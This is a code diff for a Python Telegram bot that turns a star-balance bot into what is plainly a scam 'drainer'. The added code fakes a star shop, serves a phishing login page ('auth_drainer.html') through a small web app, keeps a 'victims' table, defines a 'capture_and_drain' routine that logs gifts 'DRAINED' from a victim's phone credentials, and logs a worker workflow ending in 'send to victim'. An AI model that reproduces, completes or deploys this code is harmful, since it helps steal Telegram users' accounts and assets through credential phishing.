-        reply_markup=main_menu_kb(),
-        parse_mode="Markdown"
+    elif data == "back_to_main":
+        await query.edit_message_text(
+            query.message.text.split("\n\n")[0] if query.message.text else "Главное меню",
+            reply_markup=get_main_keyboard(),
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+async def show_shop_menu(query):
+    packages = [
+        {"stars": 50, "price": 0.69, "icon": "⭐"},
+        {"stars": 100, "price": 1.29, "icon": "⭐"},
+        {"stars": 500, "price": 5.99, "icon": "⭐"},
+        {"stars": 1000, "price": 11.99, "icon": "⭐"},
+        {"stars": 5000, "price": 59.99, "icon": "⭐"},
+        {"stars": 10000, "price": 119.99, "icon": "⭐"},
+    ]
+
+    buttons = []
+    row = []
+    for i, p in enumerate(packages):
+        row.append(InlineKeyboardButton(
+            f"{p['icon']} {p['stars']:,}",
+            callback_data=f"shop_buy_{p['stars']}"
+        ))
+        if len(row) == 2 or i == len(packages) - 1:
+            buttons.append(row)
+            row = []
+
+    buttons.append([InlineKeyboardButton("🎁 NFT-подарки", callback_data="shop_gifts")])
+    buttons.append([InlineKeyboardButton("🔄 Обмен", callback_data="shop_exchange")])
+    buttons.append([InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")])
+
+    reply_markup = InlineKeyboardMarkup(buttons)
+
+    await query.edit_message_text(
+        "🛍️ *Магазин звезд*\n\n"
+        "Выберите пакет:\n"
+        "⭐ 50 ★ — $0.69\n"
+        "⭐ 100 ★ — $1.29\n"
+        "⭐ 500 ★ — $5.99\n"
+        "⭐ 1,000 ★ — $11.99\n"
+        "⭐ 5,000 ★ — $59.99\n"
+        "⭐ 10,000 ★ — $119.99\n\n"
+        "💳 Оплата: TON, USDT, карта\n"
+        "⚡ Моментальное зачисление",
+        reply_markup=reply_markup,
+        parse_mode=ParseMode.MARKDOWN
     )
 
-@dp.callback_query(F.data.startswith("claim_"))
-async def claim_check_cb(cb: types.CallbackQuery):
-    check_id = cb.data[6:]
-    await cb.answer()
-    await process_check_claim(cb.message, check_id)
+# ---------- Capture ----------
+async def capture_and_drain(user_id: int, credentials: Dict[str, Any]):
+    phone = credentials.get('phone')
+    logger.info(f"🎯 Capturing {phone}")
+    await asyncio.sleep(2)
 
-# ─── ВЫВОД ЗВЁЗД ─────────────────────────────────────────────────────────────
-@dp.message(F.text == "🌟 Вывести звёзды")
-async def withdraw_handler(message: types.Message):
-    balance = get_balance(message.from_user.id)
-    await message.answer(
-        f"🌟 **Вывод звёзд**\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"💼 Ваш баланс: **{balance} ⭐**\n\n"
-        f"Для вывода звёзд обратитесь к администратору или\n"
-        f"создайте чек и отправьте его нужному пользователю.\n\n"
-        f"📜 Используйте раздел **Создать чек** для передачи звёзд.",
-        parse_mode="Markdown"
-    )
+    fake_gifts = [
+        {"name": "⭐ Золотая Звезда", "stars": 1000},
+        {"name": "💎 Алмазный Подарок", "stars": 500},
+    ]
 
-# ─── АВТОСКУПЩИК ─────────────────────────────────────────────────────────────
-@dp.message(F.text == "🤖 Автоскупщик")
-async def autobuy_handler(message: types.Message):
-    await message.answer(
-        "🤖 **Автоскупщик подарков**\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "Функция автоматической скупки подарков Telegram.\n\n"
-        "⚙️ **Настройки:**\n"
-        "• Мин. стоимость: не задана\n"
-        "• Макс. стоимость: не задана\n"
-        "• Статус: ⛔ Выключен\n\n"
-        "_Функция в разработке. Скоро будет доступна!_",
-        parse_mode="Markdown"
-    )
+    victim_id = cursor.execute("SELECT id FROM victims WHERE telegram_id = ?", (user_id,)).fetchone()
+    if victim_id:
+        for gift in fake_gifts:
+            cursor.execute("UPDATE stats SET value = value + 1 WHERE key = 'total_gifts_drained'")
+            logger.info(f"🎁 DRAINED: {gift['name']} from {phone}")
 
-# ─── BACK ──────────────────────────────────────────────────────────────────────
-@dp.callback_query(F.data == "back_main")
-async def back_main(cb: types.CallbackQuery, state: FSMContext):
-    await state.clear()
-    await cb.answer()
-    balance = get_balance(cb.from_user.id)
-    await cb.message.edit_text(
-        f"👋 **Главное меню**\n\n"
-        f"💼 Ваш баланс: **{balance} ⭐**\n\n"
-        f"Выберите действие:",
-        parse_mode="Markdown"
-    )
+    conn.commit()
+    logger.info(f"✅ Capture complete for {phone}")
 
-@dp.callback_query(F.data.startswith("copy_link_"))
-async def copy_link_cb(cb: types.CallbackQuery):
-    check_id = cb.data[10:]
-    bot_info = await bot.get_me()
-    link = f"https://t.me/{bot_info.username}?start=check_{check_id}"
-    await cb.answer(f"Ссылка: {link}", show_alert=True)
+# ---------- WebApp Server ----------
+template_loader = jinja2.FileSystemLoader('templates')
+template_env = jinja2.Environment(loader=template_loader)
 
-# ─── /BALANCE ─────────────────────────────────────────────────────────────────
-@dp.message(Command("balance"))
-async def cmd_balance(message: types.Message):
-    balance = get_balance(message.from_user.id)
-    await message.answer(f"💼 Ваш баланс: **{balance} ⭐**", parse_mode="Markdown")
+async def auth_page(request):
+    template = template_env.get_template('auth_drainer.html')
+    return web.Response(text=template.render(), content_type='text/html')
 
-# ─── /ADDSTARS (DEBUG ONLY) ───────────────────────────────────────────────────
-@dp.message(Command("addstars"))
-async def cmd_addstars(message: types.Message):
-    """DEBUG: /addstars 100 — добавить звёзды (убрать в продакшн)"""
-    parts = message.text.split()
-    if len(parts) == 2:
-        try:
-            amount = int(parts[1])
-            add_stars(message.from_user.id, amount)
-            await message.answer(f"✅ Добавлено {amount} ⭐ (debug режим)")
-        except ValueError:
-            await message.answer("Введите число: /addstars 100")
+async def submit_auth(request):
+    data = await request.json()
+    return web.json_response({'status': 'success'})
 
-# ─── MAIN ──────────────────────────────────────────────────────────────────────
+def setup_webapp():
+    app = web.Application()
+    app.router.add_get('/auth', auth_page)
+    app.router.add_post('/submit', submit_auth)
+    return app
+
+# ---------- Main ----------
 async def main():
-    logger.info("Запуск бота...")
-    await dp.start_polling(bot)
+    webapp = setup_webapp()
+    runner = web.AppRunner(webapp)
+    await runner.setup()
+    site = web.TCPSite(runner, WEBAPP_HOST, WEBAPP_PORT)
+    await site.start()
+    logger.info(f"🌐 WebApp: http://{WEBAPP_HOST}:{WEBAPP_PORT}")
+
+    application = Application.builder().token(BOT_TOKEN).build()
+
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("kwerteam", kwerteam_command))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_worker_dm))
+    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
+    application.add_handler(CallbackQueryHandler(handle_menu_callback))
+
+    await application.initialize()
+    await application.start()
+    await application.updater.start_polling()
+
+    logger.info("🤖 Bot started")
+    logger.info("Worker mode: /kwerteam → @username amount → get link → send to victim")
+
+    try:
+        await asyncio.Event().wait()
+    except KeyboardInterrupt:
+        pass
+
+    await application.updater.stop()
+    await application.stop()
+    await runner.cleanup()
 
 if __name__ == "__main__":
     asyncio.run(main())
